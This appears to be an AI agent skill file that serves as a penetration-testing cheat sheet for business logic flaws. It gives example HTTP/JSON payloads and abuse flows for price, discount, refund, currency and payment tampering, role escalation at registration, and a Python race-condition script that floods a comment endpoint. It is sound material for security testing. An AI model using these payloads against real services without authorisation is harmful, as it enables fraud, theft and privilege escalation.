---
name: business-logic
description: Business logic vulnerability testing - price manipulation, workflow bypass, privilege escalation. Use for logic flaw hunting.
---

# Business Logic Errors

## Description
Business logic vulnerabilities are flaws in the design and implementation of an application that allow an attacker to manipulate legitimate functionality to achieve a malicious goal. These vulnerabilities arise from assumptions made about user behavior that don't account for malicious actions.

## Key Principle
"Business logic errors take advantage of normal, intended functionality in ways that developers did not anticipate."

## Vulnerability Categories

### 1. Review Feature Exploitation

#### Test Cases
```
- Post reviews without purchasing the product
- Submit ratings outside the standard scale (e.g., -1 or 11 out of 10)
- Submit multiple ratings for the same product
- Upload unrestricted file types in review attachments
- Post reviews as other users
- CSRF attacks on review submission
```

#### Payloads
```http
# Negative rating
POST /api/review HTTP/1.1
{"product_id": "123", "rating": -5}

# Rating outside bounds
{"product_id": "123", "rating": 999}

# Review without purchase
{"product_id": "123", "rating": 5, "bypass_purchase_check": true}
```

### 2. Discount Code Exploitation

#### Test Cases
```
- Reuse single-use discount codes
- Apply discount codes to non-discounted items
- Stack multiple discount codes
- Race condition on discount application
- Mass assignment to apply unauthorized discounts
- Manipulate discount percentage values
```

#### Payloads
```http
# Apply discount multiple times
POST /api/cart/discount HTTP/1.1
{"code": "SAVE50", "apply_count": 10}

# Negative discount (price increase bypass)
{"code": "DISCOUNT", "value": -50}

# Mass assignment
{"code": "NORMAL10", "discount_percent": 100}
```

### 3. Delivery Fee Manipulation

#### Test Cases
```
- Insert negative delivery charges
- Force free delivery through parameter manipulation
- Modify delivery zone to get lower rates
- Bypass minimum order for free delivery
```

#### Payloads
```http
# Negative delivery fee
{"delivery_fee": -10.00}

# Zero delivery
{"delivery_fee": 0, "bypass_calculation": true}

# Modify delivery zone
{"zone_id": "local", "actual_zone": "international"}
```

### 4. Currency Arbitrage

#### Test Cases
```
- Purchase in weaker currency
- Request refund in stronger currency
- Exploit exchange rate timing differences
- Manipulate currency conversion during checkout
```

#### Exploitation Flow
```
1. Add item to cart: $100 USD
2. Change currency to EUR during checkout
3. Complete purchase at favorable rate
4. Request refund in original currency
5. Profit from exchange rate difference
```

### 5. Premium Feature Bypass

#### Test Cases
```
- Access premium content without subscription
- Retain access after subscription cancellation
- Manipulate access tokens/cookies
- Bypass feature flags
- Access admin-only features as regular user
```

#### Payloads
```http
# Cookie manipulation
Cookie: premium_user=true; subscription_active=1

# Feature flag bypass
{"user_id": "123", "features": ["premium", "admin"]}

# Role manipulation
{"role": "premium", "subscription_end": "2099-12-31"}
```

### 6. Refund Feature Exploitation

#### Test Cases
```
- Retain product access after refund
- Request multiple refunds for same order
- Refund to different payment method
- Partial refund manipulation
- Cancel and re-subscribe to get refund + access
```

#### Exploitation Flow
```
1. Purchase digital product
2. Download/access content
3. Request refund
4. Verify content still accessible
5. Repeat cycle
```

### 7. Cart/Wishlist Manipulation

#### Test Cases
```
- Add negative product quantities
- Exceed inventory limits
- Manipulate other users' carts
- Add items at different prices
- Apply bulk discounts to single items
```

#### Payloads
```http
# Negative quantity
{"product_id": "123", "quantity": -1}

# Price manipulation
{"product_id": "123", "quantity": 1, "price": 0.01}

# Inventory bypass
{"product_id": "123", "quantity": 9999, "ignore_stock": true}
```

### 8. Thread/Comment Manipulation

#### Test Cases
```
- Bypass comment rate limits
- Comment as privileged users
- Post in closed/locked threads
- Edit others' comments
- Delete moderation actions
```

#### Race Condition for Comments
```python
import threading
import requests

def post_comment():
    requests.post(url, data={'comment': 'spam'})

threads = [threading.Thread(target=post_comment) for _ in range(100)]
for t in threads:
    t.start()
```

### 9. Rounding Error Exploitation

#### Test Cases
```
- Exploit minimum precision limitations
- Automated micro-transactions
- Currency conversion rounding
- Interest calculation errors
```

#### Exploitation
```python
# Micro-transaction attack
# If system rounds 0.004 to 0.01
# Deposit 0.004 × 1000 times = 4.00 deposited, 10.00 credited

for _ in range(1000):
    deposit(0.004)  # Rounds to 0.01
```

### 10. Privilege Escalation via Business Logic

#### Test Cases
```
- Access admin functions via direct URL
- Modify user role during registration
- Bypass approval workflows
- Skip verification steps
- Access other users' data via parameter manipulation
```

#### Payloads
```http
# Role manipulation during registration
POST /api/register HTTP/1.1
{"username": "attacker", "password": "pass", "role": "admin"}

# Workflow bypass
{"step": "final", "skip_verification": true}
```

### 11. Payment Logic Flaws

#### Test Cases
```
- Modify payment amount after authorization
- Use expired payment methods
- Double-spending attacks
- Partial payment bypass
- Payment callback manipulation
```

#### Exploitation
```http
# Amount manipulation
{"order_id": "123", "amount": 0.01, "original_amount": 100.00}

# Payment status manipulation
{"payment_status": "completed", "verified": true}
```

## Testing Methodology

### 1. Understand the Business Logic
```
- Map all workflows
- Identify value-generating functions
- Understand user roles and permissions
- Document expected vs unexpected behaviors
```

### 2. Identify Assumptions
```
- What does the application assume about user behavior?
- What constraints exist only on the client-side?
- What sequences of actions are expected?
```

### 3. Test Boundary Conditions
```
- Minimum/maximum values
- Empty/null inputs
- Out-of-sequence operations
- Timing-based attacks
```

### 4. Test Access Controls
```
- Horizontal privilege escalation
- Vertical privilege escalation
- Function-level access control
```

## Tools
- Burp Suite (Repeater, Intruder)
- Custom scripts for race conditions
- Browser developer tools for client-side manipulation

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Business%20Logic%20Errors
- https://portswigger.net/web-security/logic-flaws
- https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability
- CWE-840: Business Logic Errors
